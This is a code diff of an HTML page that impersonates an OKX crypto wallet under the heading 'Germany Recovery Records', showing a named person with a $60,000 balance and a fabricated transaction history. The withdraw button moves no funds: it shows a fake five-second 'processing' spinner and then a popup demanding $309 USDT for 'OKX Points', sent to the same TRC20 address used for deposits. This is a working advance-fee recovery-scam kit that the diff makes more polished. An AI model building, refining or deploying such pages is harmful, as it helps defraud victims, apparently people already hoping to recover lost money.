@@ -8,110 +8,175 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 </head>
-<body class="bg-gray-900 text-white font-sans">
+<body class="bg-gray-950 text-white font-sans min-h-screen">
 
-  <div class="flex">
-    <!-- Sidebar -->
-    <aside class="w-64 bg-gray-950 p-6 border-r border-gray-800">
-      <div class="text-center mb-8">
-        <h1 class="text-3xl font-bold text-white uppercase tracking-widest">OKX</h1>
-      </div>
-      <div class="space-y-4">
-        <button onclick="showSection('fund')" class="w-full bg-black text-white py-2 rounded-full">Fund</button>
-        <button onclick="showSection('withdraw')" class="w-full bg-black text-white py-2 rounded-full">Withdraw</button>
-      </div>
-      <div class="mt-10 text-white text-sm uppercase space-y-2">
-        <p>Wallet</p>
-        <p>Main</p>
-      </div>
-    </aside>
+  <!-- PAGE VIEW -->
+  <div id="pageView" class="fixed inset-0 flex flex-col items-center justify-center bg-gradient-to-br from-gray-900 via-black to-gray-950 z-50">
+    <!-- IMAGE PLACEHOLDER: REPLACE BELOW WITH YOUR IMAGE -->
+    <div class="mb-8">
+      <img src="YOUR_IMAGE_HERE.png" alt="OKX Wallet" class="w-44 h-44 object-contain rounded-xl shadow-2xl border-4 border-gray-800" />
+      <!-- If image not ready, use this placeholder -->
+      <!-- <div class="w-44 h-44 bg-gray-800 flex items-center justify-center rounded-xl text-6xl font-bold text-gray-500">📄</div> -->
+    </div>
+    <h1 class="text-4xl font-extrabold text-white mb-4 tracking-widest">OKX WALLET</h1>
+    <p class="text-gray-300 mb-8 text-lg">Germany Recovery Records</p>
+    <button onclick="openWallet()" class="open-btn bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 text-white px-8 py-4 rounded-full text-xl font-semibold shadow-lg hover:scale-105 transition">
+      Open Wallet
+    </button>
+  </div>
 
-    <!-- Main Content -->
-    <main class="flex-1 p-8 bg-gray-800">
-      <!-- Header -->
-      <div class="flex items-center justify-between mb-6">
+  <!-- DASHBOARD -->
+  <div id="dashboard" class="hidden">
+    <div class="flex min-h-screen">
+      <!-- Sidebar -->
+      <aside class="w-72 bg-black/90 p-8 border-r border-gray-800 flex flex-col justify-between">
         <div>
-          <h2 class="text-xl text-gray-300">Processing Balance</h2>
-          <p class="text-5xl font-extrabold text-white">$7,999</p>
-          <p class="text-sm text-gray-400">[$7,999 → Application]</p>
-        </div>
-        <div class="flex items-center space-x-4">
-          <div class="text-right">
-            <p class="text-lg font-semibold">Randi Perrone-Kerfoot</p>
+          <div class="flex items-center justify-center mb-8">
+            <img src="YOUR_IMAGE_HERE.png" alt="Logo" class="w-16 h-16 rounded-lg border border-gray-700 bg-gray-900" />
+            <span class="ml-3 text-3xl font-bold text-white uppercase tracking-widest">OKX</span>
           </div>
-          <img src="https://www.gravatar.com/avatar?d=mp&s=100" alt="User Profile" class="w-16 h-16 rounded-full border-2 border-white" />
+          <div class="space-y-4">
+            <button onclick="showSection('fund')" class="w-full bg-gray-900/80 text-white py-3 rounded-lg font-semibold hover:bg-gray-800 transition">Deposit</button>
+            <button onclick="showSection('withdraw')" class="w-full bg-gray-900/80 text-white py-3 rounded-lg font-semibold hover:bg-gray-800 transition">Withdraw</button>
+          </div>
         </div>
+        <div class="mt-10 text-gray-400 text-xs uppercase space-y-2 tracking-wider">
+          <p>Wallet</p>
+          <p>Main</p>
+        </div>
+      </aside>
+
+      <!-- Main Content -->
+      <main class="flex-1 p-10 bg-gradient-to-br from-gray-900 via-gray-950 to-black">
+        <!-- Header -->
+        <div class="flex items-center justify-between mb-10">
+          <div>
+            <h2 class="text-2xl text-gray-300 font-bold tracking-wide">Available Balance</h2>
+            <p class="text-6xl font-extrabold text-white mt-2 mb-1">$60,000</p>
+            <p class="text-md text-gray-400">[USDT → Application]</p>
+          </div>
+          <div class="flex items-center space-x-4">
+            <div class="text-right">
+              <p class="text-lg font-semibold">Randi Perrone-Kerfoot</p>
+              <span class="text-xs text-gray-400">Verified Account</span>
+            </div>
+            <img src="https://www.gravatar.com/avatar?d=mp&s=100" alt="User Profile" class="w-16 h-16 rounded-full border-2 border-white shadow-lg" />
+          </div>
+        </div>
+
+        <!-- Deposit Section -->
+        <section id="fundSection" class="hidden">
+          <div class="max-w-lg mx-auto bg-gray-900 rounded-xl shadow-lg p-8 border border-gray-800">
+            <h2 class="text-2xl font-bold mb-4 text-white">Deposit USDT</h2>
+            <p class="mb-2 text-gray-300">Send USDT to this address:</p>
+            <p class="font-mono bg-gray-800 p-3 rounded mb-4 select-all text-lg">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</p>
+            <div id="qrcode" class="mb-6 flex justify-center"></div>
+            <div class="text-xs text-gray-500">Only send USDT (TRC20)</div>
+          </div>
+        </section>
+
+        <!-- Withdraw Section -->
+        <section id="withdrawSection" class="hidden">
+          <div class="max-w-lg mx-auto bg-gray-900 rounded-xl shadow-lg p-8 border border-gray-800">
+            <h2 class="text-2xl font-bold mb-6 text-white">Withdraw USDT</h2>
+            <div class="space-y-4">
+              <input id="withdrawAddress" type="text" placeholder="Wallet Address" class="w-full bg-gray-800 p-3 rounded text-white font-mono focus:ring-2 focus:ring-blue-500 outline-none" />
+              <input id="withdrawAmount" type="text" placeholder="Amount (USDT)" class="w-full bg-gray-800 p-3 rounded text-white font-mono focus:ring-2 focus:ring-blue-500 outline-none" />
+              <button onclick="startWithdraw()" class="bg-gradient-to-r from-gray-800 via-gray-700 to-gray-900 px-6 py-3 rounded font-bold text-white hover:scale-105 transition flex items-center justify-center space-x-2">
+                <span>Confirm Withdraw</span>
+              </button>
+            </div>
+          </div>
+        </section>
+
+        <!-- Transaction History -->
+        <section class="mt-14 max-w-xl mx-auto">
+          <h2 class="text-2xl font-bold mb-4 text-white">Transaction History</h2>
+          <ul class="max-h-64 overflow-y-auto space-y-2 pr-2">
+            <li class="bg-gray-800 p-3 rounded flex justify-between items-center">
+              <span>[08/29/2025] Deposit</span> <span class="text-green-400 font-bold">+103.55 USDT</span>
+            </li>
+            <li class="bg-gray-800 p-3 rounded flex justify-between items-center">
+              <span>[08/28/2025] Withdrawal</span> <span class="text-red-400 font-bold">-32.00 USDT</span>
+            </li>
+            <li class="bg-gray-800 p-3 rounded flex justify-between items-center">
+              <span>[08/27/2025] Deposit</span> <span class="text-green-400 font-bold">+302.00 USDT</span>
+            </li>
+            <li class="bg-gray-800 p-3 rounded flex justify-between items-center">
+              <span>[08/26/2025] Withdrawal</span> <span class="text-red-400 font-bold">-100.00 USDT</span>
+            </li>
+            <li class="bg-gray-800 p-3 rounded flex justify-between items-center">
+              <span>[08/25/2025] Deposit</span> <span class="text-green-400 font-bold">+88.00 USDT</span>
+            </li>
+          </ul>
+        </section>
+      </main>
+    </div>
+  </div>
+
+  <!-- Spinner Modal for Withdraw -->
+  <div id="spinnerModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+    <div class="p-8 bg-gray-900 rounded-xl shadow-xl flex flex-col items-center border border-blue-400">
+      <div class="mb-4">
+        <svg class="animate-spin h-12 w-12 text-blue-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+        </svg>
       </div>
-
-      <!-- Fund Section -->
-      <section id="fundSection" class="hidden">
-        <h2 class="text-xl font-bold mb-4">Fund</h2>
-        <p class="mb-2">Send USDT to:</p>
-        <p class="font-mono bg-gray-700 p-2 rounded mb-4">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</p>
-        <div id="qrcode" class="mb-6"></div>
-      </section>
-
-      <!-- Withdraw Section -->
-      <section id="withdrawSection" class="hidden">
-        <h2 class="text-xl font-bold mb-4">Withdraw</h2>
-        <div class="space-y-2">
-          <input type="text" placeholder="Wallet Address" class="w-full bg-gray-700 p-2 rounded" />
-          <input type="text" placeholder="Amount (USDT)" class="w-full bg-gray-700 p-2 rounded" />
-          <button onclick="startWithdraw()" class="bg-black px-4 py-2 rounded text-white">Confirm</button>
-        </div>
-      </section>
-
-      <!-- Transaction History -->
-      <section class="mt-10">
-        <h2 class="text-xl font-bold mb-4">Transaction History</h2>
-        <div class="max-h-64 overflow-y-auto space-y-2 pr-2">
-          <li class="bg-gray-700 p-2 rounded">[08/29/2025] Deposit +103.55 USDT</li>
-          <li class="bg-gray-700 p-2 rounded">[08/28/2025] Withdrawal -32.00 USDT</li>
-          <li class="bg-gray-700 p-2 rounded">[08/27/2025] Deposit +302.00 USDT</li>
-          <li class="bg-gray-700 p-2 rounded">[08/26/2025] Withdrawal -100.00 USDT</li>
-          <li class="bg-gray-700 p-2 rounded">[08/25/2025] Deposit +88.00 USDT</li>
-        </div>
-      </section>
-    </main>
+      <h3 class="text-blue-400 text-xl font-bold mb-2">Processing Withdraw</h3>
+      <p class="text-gray-300 text-center">Please wait while your withdrawal is being processed...</p>
+    </div>
   </div>
 
   <!-- Error Popup -->
-  <div id="errorPopup" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center hidden">
-    <div class="bg-gray-800 p-6 rounded-lg text-center max-w-md border border-yellow-400">
-      <h3 class="text-yellow-400 text-xl font-bold mb-2">OKX Points Needed</h3>
-      <p class="text-sm mb-4">$309 USDT is required to rank up your OKX Points, which may take up to one hour to process. Failure to provide the required OKX Points balance will result in a declined application.</p>
-      <p class="text-sm mb-2">Payment Address:</p>
-      <p class="font-mono bg-gray-700 p-2 rounded mb-4">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</p>
-      <button onclick="closePopup()" class="bg-gray-700 px-4 py-2 rounded text-white">OK</button>
+  <div id="errorPopup" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+    <div class="bg-gray-900 p-8 rounded-xl text-center max-w-md border-2 border-yellow-400 shadow-2xl">
+      <h3 class="text-yellow-400 text-2xl font-bold mb-3">OKX Points Needed</h3>
+      <p class="text-sm mb-4 text-gray-200">$309 USDT is required to rank up your OKX Points, which may take up to one hour to process.<br>
+        Failure to provide the required OKX Points balance will result in a declined application.</p>
+      <p class="text-sm mb-2 text-gray-400">Payment Address:</p>
+      <p class="font-mono bg-gray-800 p-2 rounded mb-4 text-lg select-all">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</p>
+      <button onclick="closePopup()" class="bg-gradient-to-r from-yellow-500 via-yellow-400 to-yellow-600 px-8 py-3 rounded text-black font-bold mt-2 hover:scale-105 transition">OK</button>
     </div>
   </div>
 
   <!-- Scripts -->
   <script>
+    // Animate Wallet Opening
+    function openWallet() {
+      document.getElementById('pageView').classList.add('hidden');
+      setTimeout(() => {
+        document.getElementById('dashboard').classList.remove('hidden');
+        showSection('fund');
+      }, 250); // Optional: add fade effect
+    }
+
+    // Section Switch
     function showSection(section) {
       document.getElementById('fundSection').style.display = section === 'fund' ? 'block' : 'none';
       document.getElementById('withdrawSection').style.display = section === 'withdraw' ? 'block' : 'none';
     }
 
+    // Withdraw logic: Spinner then Error
     function startWithdraw() {
-      let progress = 0;
-      const interval = setInterval(() => {
-        progress++;
-        if (progress >= 99) {
-          clearInterval(interval);
-          document.getElementById('errorPopup').style.display = 'flex';
-        }
-      }, 220); // 22 seconds total
+      // Show spinner
+      document.getElementById('spinnerModal').style.display = 'flex';
+      setTimeout(() => {
+        document.getElementById('spinnerModal').style.display = 'none';
+        document.getElementById('errorPopup').style.display = 'flex';
+      }, 5000); // 5 seconds
     }
 
     function closePopup() {
       document.getElementById('errorPopup').style.display = 'none';
     }
 
-    // QR Code Generation
-    QRCode.toCanvas(document.getElementById("qrcode"), "TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o", function (error) {
-      if (error) console.error(error);
-    });
+    // QR Code Generation for Deposit
+    window.onload = function () {
+      QRCode.toCanvas(document.getElementById("qrcode"), "TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o", function (error) {
+        if (error) console.error(error);
+      });
+    };
   </script>
 </body>
 </html>
